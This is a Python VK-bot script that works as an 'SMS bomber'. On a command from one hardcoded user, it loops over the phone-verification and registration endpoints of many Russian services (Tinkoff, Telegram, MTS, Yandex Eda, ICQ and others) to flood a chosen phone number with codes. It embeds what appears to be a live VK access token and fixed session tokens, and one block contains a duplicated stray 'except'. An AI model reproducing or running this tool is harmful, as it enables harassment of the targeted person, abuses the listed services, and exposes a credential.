try:
	import vk_api, threading, requests, fake_useragent, os
	from vk_api.longpoll import VkLongPoll, VkEventType
	from vk_api.utils import get_random_id


	def text1(arg):
	    return arg.split()[1]


	def text2(arg):
	    return arg.split()[2]


	def write_message(sender, message):
	    authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id()})


	def spam(phone, ckok, xz, zx_lol):
		o = 0
		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36'}
		phone = phone
		pulse = '+' + phone
		no7 = phone[1:] 
		masska1 = phone = '+7+(' + phone[1:4] + ')+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
		masska2 = phone[1:4] + '+' + phone[4:7] + '+' + phone[7:9] + '-' + phone[9:11]
		masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
		while int(ckok) > o:
			o += 1
			try:requests.post("https://lenta.com/api/v1/registration/requestValidationCode", 
					json={"phone" : "+" + phone}, headers=headers, timeout=5.05)
			except:pass

			except:pass
			try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
					    data={"phone": "+" + phone}, headers=headers, timeout=5.05)
			except:pass

			try:requests.post("https://my.telegram.org/auth/send_password",
					    data={"phone": "+" + phone}, headers=headers, timeout=5.05)
			except:pass
			try:requests.post("https://apteka.magnit.ru/api/personal/auth/code/", 
				    data={'phone': phone}, headers=headers, timeout=5.05)
			except:pass

			try:requests.post("https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https://moskva.mts.ru/json/auth/publicuser/afterlogin",
				    json= {
					"login": masska3,
					"IDToken1": no7,
					"IDButton": "Submit",
					"encoded": "false",
					"loginURL": "?service=sitemts&goto=https%3A%2F%2Fmoskva.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin",
					"csrf.sign": "fee386083ef6b2ded9d9e2abebe2445ffee6750a32f501987d864a6b6aa619a7058e7f2ea0bfd3f3c0fafa9e34c0401071e07dfd620e9e7eeb8302205abe6ae4",
					"csrf.ts": "1630205683640"	
				    }, headers=headers, timeout=5.05)
			except:pass



			try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
					data={"phone": pulse}, headers=headers, timeout=5.05)
			except:pass
			try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
			except:pass
			try:requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode", json={"reqId": "91101-1606335718", "params": {"phone": phone, "language": "ru-RU", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers)
			except:pass
			try: requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
				"msisdn": phone,
				"locale": "en",
				"countryCode": "ru",
				"version": "1",
				"k": "ic1rtwz1s1Hj1O0r",
				"r": "46763"
			    }, headers=headers)
			except:pass
			try:requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code", json={"phone_number": phone}, headers=headers)
			except:pass
			try:requests.post("https://my.modulbank.ru/api/v2/auth/phone", data={"CellPhone": phone[1:]}, headers=headers)
			except:pass


	token = "ab483c22ea3083701535b91c09775f8507915943664a874f96aa2978eb0cdfc74c0824f08acd700364872"
	authorize = vk_api.VkApi(token=token)
	longpoll = VkLongPoll(authorize)
	for event in longpoll.listen():
		if event.type == VkEventType.MESSAGE_NEW and event.to_me:
			reseived_message = event.text.lower()
			sender = event.user_id
			if sender == 678105126:
			    if reseived_message == 'начать':
			    	write_message(sender, "Работает!")
				    # ОТПРАВКА ЗАПРОСТА СЕРЕЗ ПОТОКИ 
			    elif reseived_message[0:2] == '/l':
			    	nomer = text1(reseived_message)
			    	ckok = text2(reseived_message)
			    	t = threading.Thread(target=spam, args=(nomer, int(ckok * 5), 1, 2))
			    	t.start()
			    	write_message(sender, 'Всё ок')
except:
    os.system('python bot.py')
